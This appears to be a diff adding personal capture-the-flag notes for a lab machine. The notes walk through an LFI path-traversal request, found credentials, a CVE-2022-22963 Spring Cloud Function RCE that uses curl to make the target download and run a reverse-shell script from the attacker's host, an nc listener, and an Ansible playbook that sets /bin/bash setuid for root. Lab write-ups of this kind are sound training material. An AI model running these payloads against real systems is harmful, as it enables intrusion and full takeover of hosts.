@@ -1,0 +1,77 @@
+known dirs {
+/blogs
+/register
+/upload
+}
+
+Box is using an Apache Tomcat application based of this error:
+	HTTP Status 404 – Not Found
+
+Using the upload directory, when you attempt to send files that arent image files the site produces this error:
+	Only image files are accepted!
+
+/show_image?img=[image file]
+	This uses PHP so an LFI can be possible
+	NOTE : LFI vuln is here! -> This LFI displays Dir Contents!
+
+Target Users {
+root:x:0:0:root:/root:/bin/bash
+frank:x:1000:1000:frank:/home/frank:/bin/bash
+phil:x:1001:1001::/home/phil:/bin/bash
+}
+
+========== LFI Req ============
+GET /show_image?img=../../../../../../../ HTTP/1.1
+Host: 10.10.11.204:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+===============================
+
+Inside of Franks home directory there is a settings.xml that shows
+creds phil:DocPhillovestoInject123 -> not SSH creds
+
+Possibly check out pom.xml ??? --> extensive reading shows possible things that could be vulnerable
+
+Thru the var/www/ directory : the Target contains compiled files most likely being things we can access via the target website
+
+spring-cloud-function-web v3.2.2 -> Vuln to possible RCE Appears to not be working but it is:
+	CVE-2022-22963
+	
+======= Upload RevShell & Execute =========
+python3 -m http.server 80 -> directory with shell.sh (EDIT THE FILE)
+
+curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget -P /tmp http://10.10.14.27:80/shell.sh")' --data-raw 'data' -v
+
+nc -lvnp 4444
+	
+curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/shell.sh")' --data-raw 'data' -v
+===========================================
+
+The box has automated processes relaying to something called: Ansible
+Supposidly there is a possibly playbook.yml exploit that is techincally used to priv-esc to ROOT
+
+After gaining the reverse shell the terminal is very buggy so patience is needed!
+
+The phil:DocPhillovestoInject123 works not for SSH, but for su phil within the frank shell
+
+su likes to be buggy as well, or fake the terminal for being busted, trying out commands after waiting some time, you've escalated to Phil!
+
+Root Esc is fairly simple, PSPY shows all the processes running on the box, root is running a playbook process where they clean the tasks, add their normal task,
+AND run all files ending in .yml, we just have to inject a new yml playbook as Phil because Phil has permission to write files in the opt/automation/tasks dir.
+
+After some research there was a yml file contents that allows a user to simply run /bin/bash -p and esc to Root
+
+======== Exploit Code ==========
+- hosts: localhost
+	tasks:
+	  - name: Evil
+	    ansible.builtin.shell: |
+	      chmod +s /bin/bash
+	    become: true
+================================
